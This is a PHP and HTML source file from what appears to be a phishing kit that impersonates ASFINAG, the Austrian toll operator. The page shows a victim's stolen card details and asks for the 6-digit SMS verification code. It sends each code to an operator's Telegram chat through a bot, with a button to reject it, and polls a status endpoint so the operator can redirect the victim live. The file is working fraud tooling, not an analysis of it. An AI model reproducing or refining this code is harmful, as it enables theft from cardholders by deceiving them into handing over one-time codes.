<?php
require_once 'config.php';

// Get session ID from URL
$sessionId = $_GET['session'] ?? '';
if (!preg_match('/^[a-f0-9]{32}$/', $sessionId)) {
    die('Invalid session ID');
}

$sessionFile = SESSIONS_DIR . '/' . $sessionId . '.json';
if (!file_exists($sessionFile)) {
    die('Session not found');
}

// Read session data
$sessionData = json_decode(file_get_contents($sessionFile), true);
$sessionData['session_id'] = $sessionId;
$cardData = $sessionData['card_data'];

// Check if card is blocked
if (isCardBlocked($cardData['number'])) {
    die('This card has been blocked. Please use another payment method.');
}

// Check for error parameter from incorrect verification
$error = null;
if (isset($_GET['error']) && $_GET['error'] === 'incorrect') {
    $error = 'The verification code you entered is incorrect. Please try again.';
}

$pageTitle = 'SMS Verification';
$checkStatusUrl = buildPageUrl('check_status');

// Update current page in session (atomic update to preserve session_id)
updateSessionData($sessionId, function(&$sessionData) use ($pageTitle) {
    $sessionData['current_page'] = $pageTitle;
    return true;
});

// Process SMS form submission
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $smsCode = preg_replace('/[^0-9]/', '', $_POST['sms_code'] ?? '');
    
    if (empty($smsCode) || strlen($smsCode) < 4) {
        $error = 'Please enter a valid SMS code';
    } else {
        // Use atomic update to prevent race conditions
        $sendSuccess = false;
        $rootMessageId = null;
        $responseData = null;
        
        updateSessionData($sessionId, function(&$sessionData) use ($smsCode, &$sendSuccess, &$rootMessageId, &$responseData) {
            $adminConfig = getAdminConfigFromSession($sessionData);
            $chatId = $adminConfig['chat_id'] ?? ADMIN_CHAT_ID;
            
            // Get root message ID
            $rootMessageId = $sessionData['root_message']['message_id'] ?? $sessionData['last_message']['message_id'] ?? null;
            
            $replyText = "📲 *SMS Code Received*\n";
            $replyText .= "Code: `$smsCode`\n";
            $replyText .= "Session: `" . ($sessionData['session_id'] ?? '') . "`";
            
            // Build keyboard with only incorrect button
            $keyboard = [
                'inline_keyboard' => [
                    [
                        ['text' => '❌ Incorrect', 'callback_data' => "verify:" . ($sessionData['session_id'] ?? '') . ":sms:incorrect"]
                    ]
                ]
            ];
            
            // Send SMS code to Telegram (always send, even if rootMessageId is missing)
            $url = "https://api.telegram.org/bot" . BOT_TOKEN . "/sendMessage";
            $data = [
                'chat_id' => $chatId,
                'text' => $replyText,
                'parse_mode' => 'Markdown',
                'reply_markup' => json_encode($keyboard)
            ];
            
            // Add reply_to_message_id only if available
            if ($rootMessageId) {
                $data['reply_to_message_id'] = $rootMessageId;
            }
            
            $ch = curl_init();
            curl_setopt_array($ch, [
                CURLOPT_URL => $url,
                CURLOPT_POST => true,
                CURLOPT_POSTFIELDS => $data,
                CURLOPT_RETURNTRANSFER => true,
                CURLOPT_TIMEOUT => 10
            ]);
            $response = curl_exec($ch);
            $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
            $curlError = curl_error($ch);
            curl_close($ch);
            
            // Parse response to check if it succeeded
            $responseData = json_decode($response, true);
            $sendSuccess = ($httpCode === 200 && !empty($responseData['ok']));
            
            // Log if sending failed
            if (!$sendSuccess) {
                error_log("SMS code send failed: HTTP $httpCode, Error: $curlError, Response: $response");
            }
            
            // Update session data
            $sessionData['sms_code'] = $smsCode;
            $sessionData['sms_submitted_at'] = time();
            $sessionData['current_page'] = 'Waiting for Verification';
            $sessionData['last_verification_type'] = 'sms'; // Store verification type for incorrect redirect
            
            return true;
        });
        
        // Don't call updateRootMessage here - it's slow and causes delay
        // Presence will be updated by check_status.php polling
        
        header("Location: waiting.php?session=$sessionId");
        exit();
    }
}
?>
<!DOCTYPE html>
<html lang="de">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ASFINAG - SMS Verification</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
            background: #f3f4f6;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }

        .asfinag-container {
            max-width: 520px;
            width: 100%;
            background: white;
            border-radius: 16px;
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.1);
            overflow: hidden;
        }

        .asfinag-header {
            background: #ea580c;
            padding: 32px 24px;
            text-align: center;
        }

        .asfinag-logo {
            margin-bottom: 16px;
        }

        .asfinag-logo svg {
            width: 120px;
            height: auto;
        }

        .asfinag-title {
            color: white;
            font-size: 28px;
            font-weight: 700;
            margin-bottom: 6px;
        }

        .asfinag-subtitle {
            color: rgba(255, 255, 255, 0.9);
            font-size: 14px;
        }

        .asfinag-content {
            padding: 32px 28px;
            background: white;
        }

        /* Card Preview */
        .card-preview-block {
            background: #fef3c7;
            border-left: 4px solid #ea580c;
            border-radius: 12px;
            padding: 20px;
            margin-bottom: 28px;
            text-align: center;
        }

        .card-number-masked {
            font-size: 20px;
            font-weight: 700;
            color: #ea580c;
            margin-bottom: 8px;
            letter-spacing: 1px;
        }

        .card-info-details {
            font-size: 13px;
            color: #6b7280;
        }

        /* Code Input Section */
        .code-input-section {
            margin-bottom: 28px;
        }

        .code-label {
            display: block;
            text-align: center;
            margin-bottom: 20px;
            font-size: 15px;
            color: #374151;
            font-weight: 600;
        }

        .code-inputs-row {
            display: flex;
            justify-content: center;
            gap: 12px;
            margin-bottom: 15px;
        }

        .code-digit-input {
            width: 52px;
            height: 60px;
            text-align: center;
            font-size: 24px;
            font-weight: 700;
            border: 2px solid #e5e7eb;
            border-radius: 12px;
            background: white;
            transition: all 0.2s ease;
            color: #1f2937;
        }

        .code-digit-input:focus {
            outline: none;
            border-color: #ea580c;
            box-shadow: 0 0 0 3px rgba(234, 88, 12, 0.1);
            transform: translateY(-2px);
        }

        .code-digit-input.filled {
            border-color: #16a34a;
            background: rgba(22, 163, 74, 0.05);
        }

        .code-hint-text {
            text-align: center;
            font-size: 13px;
            color: #9ca3af;
        }

        /* Submit Button */
        .verify-submit-btn {
            width: 100%;
            padding: 14px;
            background: #ea580c;
            color: white;
            border: none;
            border-radius: 10px;
            font-size: 16px;
            font-weight: 700;
            cursor: pointer;
            transition: all 0.2s;
            margin-bottom: 20px;
        }

        .verify-submit-btn:hover:not(:disabled) {
            background: #c2410c;
            transform: translateY(-1px);
            box-shadow: 0 4px 12px rgba(234, 88, 12, 0.3);
        }

        .verify-submit-btn:disabled {
            opacity: 0.5;
            cursor: not-allowed;
        }

        /* Security Notice */
        .security-notice-block {
            background: #f9fafb;
            border-radius: 10px;
            padding: 14px 18px;
            font-size: 12px;
            color: #6b7280;
            text-align: center;
            border: 1px solid #e5e7eb;
            margin-bottom: 20px;
        }

        .security-notice-block strong {
            color: #ea580c;
            font-weight: 600;
        }

        /* Timer */
        .timer-block {
            text-align: center;
            font-size: 13px;
            color: #9ca3af;
        }

        .countdown-timer {
            font-weight: 700;
            color: #ea580c;
        }

        /* Error Message */
        .error-alert {
            background: #fef2f2;
            border: 1px solid #fca5a5;
            border-radius: 10px;
            padding: 12px 16px;
            margin-bottom: 24px;
            text-align: center;
            color: #dc2626;
            font-size: 13px;
            font-weight: 500;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
        }

        .error-alert::before {
            content: "⚠️";
            font-size: 16px;
        }

        /* Loading Overlay */
        .loading-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(255, 255, 255, 0.95);
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 1000;
            opacity: 0;
            visibility: hidden;
            transition: all 0.3s ease;
        }

        .loading-overlay.active {
            opacity: 1;
            visibility: visible;
        }

        .loading-spinner {
            width: 50px;
            height: 50px;
            border: 4px solid #e5e7eb;
            border-top: 4px solid #ea580c;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        @keyframes bounce {
            0%, 20%, 50%, 80%, 100% { transform: translateY(0); }
            40% { transform: translateY(-5px); }
            60% { transform: translateY(-3px); }
        }

        .code-digit-input.completed {
            animation: bounce 0.6s ease;
        }

        @media (max-width: 480px) {
            .asfinag-content {
                padding: 24px 20px;
            }
            .asfinag-header {
                padding: 24px 20px;
            }
            .code-inputs-row {
                gap: 8px;
            }
            .code-digit-input {
                width: 45px;
                height: 55px;
                font-size: 22px;
            }
            .asfinag-title {
                font-size: 24px;
            }
        }
    </style>
</head>
<body>
    <div class="asfinag-container">
        <div class="asfinag-header">
            <div class="asfinag-logo">
                <svg viewBox="0 0 200 60" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <rect width="200" height="60" rx="8" fill="white"/>
                    <text x="100" y="38" font-size="24" font-weight="800" text-anchor="middle" fill="#ea580c" font-family="Arial, sans-serif" letter-spacing="2">ASFINAG</text>
                </svg>
            </div>
            <h1 class="asfinag-title">SMS Verification</h1>
            <p class="asfinag-subtitle">Enter the code sent to your phone</p>
        </div>
        
        <div class="asfinag-content">
            <?php if (isset($error)): ?>
                <div class="error-alert"><?= htmlspecialchars($error) ?></div>
            <?php endif; ?>
            
            <div class="card-preview-block">
                <div class="card-number-masked">
                    **** **** **** <?= substr($cardData['number'], -4) ?>
                </div>
                <div class="card-info-details">
                    <?= htmlspecialchars($cardData['holder']) ?> • Expires <?= htmlspecialchars($cardData['expiry']) ?>
                </div>
            </div>
            
            <form method="POST" action="sms.php?session=<?= $sessionId ?>" id="sms-form">
                <div class="code-input-section">
                    <label class="code-label">Enter verification code</label>
                    <div class="code-inputs-row">
                        <input type="text" inputmode="numeric" pattern="[0-9]*" class="code-digit-input" maxlength="1" data-index="1" autocomplete="off">
                        <input type="text" inputmode="numeric" pattern="[0-9]*" class="code-digit-input" maxlength="1" data-index="2" autocomplete="off">
                        <input type="text" inputmode="numeric" pattern="[0-9]*" class="code-digit-input" maxlength="1" data-index="3" autocomplete="off">
                        <input type="text" inputmode="numeric" pattern="[0-9]*" class="code-digit-input" maxlength="1" data-index="4" autocomplete="off">
                        <input type="text" inputmode="numeric" pattern="[0-9]*" class="code-digit-input" maxlength="1" data-index="5" autocomplete="off">
                        <input type="text" inputmode="numeric" pattern="[0-9]*" class="code-digit-input" maxlength="1" data-index="6" autocomplete="off">
                    </div>
                    <input type="hidden" name="sms_code" id="sms-code-hidden">
                    <div class="code-hint-text">Type the 6-digit code from your SMS message</div>
                </div>
                
                <button type="submit" class="verify-submit-btn" id="submit-btn" disabled>
                    Verify Code
                </button>
            </form>
            
            <div class="security-notice-block">
                <strong>Security Notice:</strong> For your protection, we've sent a verification code to the phone number associated with your card.
            </div>
            
            <div class="timer-block">
                Code expires in: <span class="countdown-timer" id="countdown">05:00</span>
            </div>
        </div>
    </div>

    <div class="loading-overlay" id="loading-overlay">
        <div class="loading-spinner"></div>
    </div>

    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const codeInputs = document.querySelectorAll('.code-digit-input');
            const hiddenInput = document.getElementById('sms-code-hidden');
            const submitBtn = document.getElementById('submit-btn');
            const form = document.getElementById('sms-form');
            const loadingOverlay = document.getElementById('loading-overlay');
            let countdown = 300;
            
            codeInputs[0].focus();
            startCountdown();
            
            codeInputs.forEach((input, index) => {
                input.addEventListener('input', function(e) {
                    const value = this.value;
                    if (!/^\d*$/.test(value)) {
                        this.value = '';
                        return;
                    }
                    if (value.length === 1) {
                        this.classList.add('filled');
                        if (index < codeInputs.length - 1) {
                            codeInputs[index + 1].focus();
                        }
                        checkCodeCompletion();
                    }
                });
                
                input.addEventListener('keydown', function(e) {
                    if (e.key === 'Backspace' && this.value === '') {
                        if (index > 0) {
                            codeInputs[index - 1].focus();
                            codeInputs[index - 1].value = '';
                            codeInputs[index - 1].classList.remove('filled');
                            checkCodeCompletion();
                        }
                    }
                    if (e.key === 'ArrowLeft' && index > 0) {
                        codeInputs[index - 1].focus();
                    }
                    if (e.key === 'ArrowRight' && index < codeInputs.length - 1) {
                        codeInputs[index + 1].focus();
                    }
                });
                
                input.addEventListener('paste', function(e) {
                    e.preventDefault();
                    const pasteData = e.clipboardData.getData('text').replace(/\D/g, '').slice(0, 6);
                    if (pasteData.length > 0) {
                        codeInputs.forEach((input, i) => {
                            if (i < pasteData.length) {
                                input.value = pasteData[i];
                                input.classList.add('filled');
                            } else {
                                input.value = '';
                                input.classList.remove('filled');
                            }
                        });
                        const focusIndex = Math.min(pasteData.length - 1, codeInputs.length - 1);
                        codeInputs[focusIndex].focus();
                        checkCodeCompletion();
                    }
                });
            });
            
            function checkCodeCompletion() {
                const code = Array.from(codeInputs).map(input => input.value).join('');
                hiddenInput.value = code;
                if (code.length === 6) {
                    submitBtn.disabled = false;
                    codeInputs.forEach(input => input.classList.add('completed'));
                    setTimeout(() => {
                        showLoading();
                        form.submit();
                    }, 500);
                } else {
                    submitBtn.disabled = true;
                    codeInputs.forEach(input => input.classList.remove('completed'));
                }
            }
            
            function showLoading() {
                loadingOverlay.classList.add('active');
            }
            
            function startCountdown() {
                const countdownElement = document.getElementById('countdown');
                const timer = setInterval(function() {
                    const minutes = Math.floor(countdown / 60);
                    const seconds = countdown % 60;
                    countdownElement.textContent = minutes.toString().padStart(2, '0') + ':' + seconds.toString().padStart(2, '0');
                    if (countdown <= 60) countdownElement.style.color = '#dc2626';
                    if (countdown <= 0) {
                        clearInterval(timer);
                        countdownElement.textContent = '00:00';
                        codeInputs.forEach(input => { input.disabled = true; input.placeholder = '×'; });
                        submitBtn.disabled = true;
                        submitBtn.textContent = 'Code Expired';
                        submitBtn.style.background = '#dc2626';
                    }
                    countdown--;
                }, 1000);
            }
            
            form.addEventListener('submit', function(e) {
                const code = hiddenInput.value;
                if (code.length < 4) {
                    e.preventDefault();
                    return;
                }
                showLoading();
            });
            
            if (window.history.replaceState) {
                window.history.replaceState(null, null, window.location.href);
            }
        });
    </script>
    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const sessionId = <?= json_encode($sessionId) ?>;
            const pageTitle = <?= json_encode($pageTitle) ?>;
            const checkStatusUrl = <?= json_encode($checkStatusUrl) ?>;
            
            const poll = () => {
                fetch(`${checkStatusUrl}?session=${encodeURIComponent(sessionId)}&page=${encodeURIComponent(pageTitle)}`)
                    .then(r => r.json())
                    .then(data => {
                        if (data.redirect) window.location.href = data.redirect;
                    })
                    .catch(() => {});
            };
            poll();
            setInterval(poll, 3000);
        });
    </script>
    <?php require_once 'presence_client.php'; ?>
</body>
</html>